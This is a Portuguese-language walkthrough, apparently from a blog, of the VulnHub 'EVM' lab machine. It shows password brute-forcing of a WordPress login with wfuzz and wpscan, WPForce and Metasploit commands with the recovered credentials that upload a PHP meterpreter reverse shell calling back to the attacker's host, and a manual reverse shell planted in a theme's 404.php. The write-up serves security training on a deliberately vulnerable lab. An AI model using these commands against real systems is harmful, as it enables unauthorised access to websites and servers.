---
title: "VulnHub - EVM"
tags: [Linux, Easy, WordPress, WPForce, Wfuzz, BurpSuite, Wpscan, Metasploit, Linpeas]
categories: VulnHub
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/inicial.png)

Link: <https://www.vulnhub.com/entry/djin-1,397/>

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.100/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 7 portas aberta no servidor

> Porta 22 -> SSH

> Porta 53 -> DNS

> Porta 80 -> Web

> Portas 110, 139 e 143 -> E-mail

> Porta 445 -> SMB

## Enumeração da Porta 80

Primeira coisa a se fazer é abrir a página web, pra ver o que tem nela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/web.png)

Algo nos chamou atenção... a seguinte mensagem que apareceu **you can find me at /wordpress/ im vulnerable webapp :)**

Rodamos o Gobuster nela também

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/gobuster.png)

### /wordpress/

Acessamos a página /wordpress/ então

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/web1.png)

De cara vemos que temos um usuário, o **c0rrupt3d_brain**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/web2.png)

Nos comentários verificamos que ele é explorável

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/comment.png)

Tentamos fazer um BruteForce nele então

### Primeiro Modo - Wfuzz

Primeiro modo de tentarmos é através do Wfuzz

Para isso vamos jogar a requisição para o BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/wp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/wp1.png)

Bom, vemos que a requisição está normal, então podemos fazer um bruteforce com o wfuzz normal nele

Aqui eu utilizei uma wordlist pequena já com a senha pra demonstração

```bash
wfuzz -c -w senhas.txt -d "log=c0rrupt3d_brain&pwd=FUZZ" --hw 255,246 http://192.168.56.103/wordpress/wp-login.php
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/wp2.png)

### Wpscan

Não uso muito mais essa ferramenta pq ela é 'muito automática' e também por que está pedindo uma chave pra poder gerar a busca por vulnerabilidades, mas vou demostrar pra fins didáticos

```bash
wpscan --url http://192.168.56.103/wordpress -U c0rrupt3d_brain -P senhas.txt
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/wp3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/wp4.png)

# www-data

Agora, então, vamos pegar um shell

## WPForce

Primeira ferramenta que vou demonstrar é através do WPFOrce, muito simples de utilizar

[WPForce](https://github.com/n00py/WPForce)

```bash
python yertle.py -u "c0rrupt3d_brain" -p "24992499" -t "http://192.168.56.103/wordpress/" -i
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/wp6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/wp5.png)

Simples assim.

## Metasploit

Não gosto do metasploit, mas vou demonstrar pra fins didáticos

```
set payload php/meterpreter/reverse_tcp
use exploit/unix/webapp/wp_admin_shell_upload
set lhost 192.168.56.102
set rhosts 192.168.56.103
set targeturi /wordpress
set username c0rrupt3d_brain
set password 24992499
exploit
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/meta.png)

## Manual

Agora do jeito que eu mais gosto que é fazendo as coisas manualmente, entendendo o que está sendo executado

Logamos na aplicação com o login e a senha

c0rrupt3d_brain:24992499

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/login.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/login1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/login2.png)

Navegamos até um que possamos editar, e por surpresa encontramos até uma mensagem dizendo que lá podemos editar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/login3.png)

Então upamos nosso php reverse shell dentro dele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/php.png)

Lembrar de mudar IP e Porta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/php1.png)

Atualizamos o arquivo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/up.png)

Abrimos nosso nc pra receber a reverse

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/php2.png)

Agora executamos o payload

**http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/php3.png)

Recebemos o reverse

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/php4.png)

# www-data - Root

Agora vamos iniciar a escalação de privilégio dessa máquinas

Rodamos o [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/linpeas.png)

Baixamos ele na nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/linpeas1.png)

E executamos no servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/lin.png)

Encontramos a senha do mysql

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/lin1.png)

Logamos nele com sucesso, mas não conseguimos extrair muita coisa

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/mysql.png)

Senha do root???!!!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/lin2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/lin3.png)

Sim, é a senha do root...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/lin4.png)

# Flags

Ai está a flag de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-evm/root.png)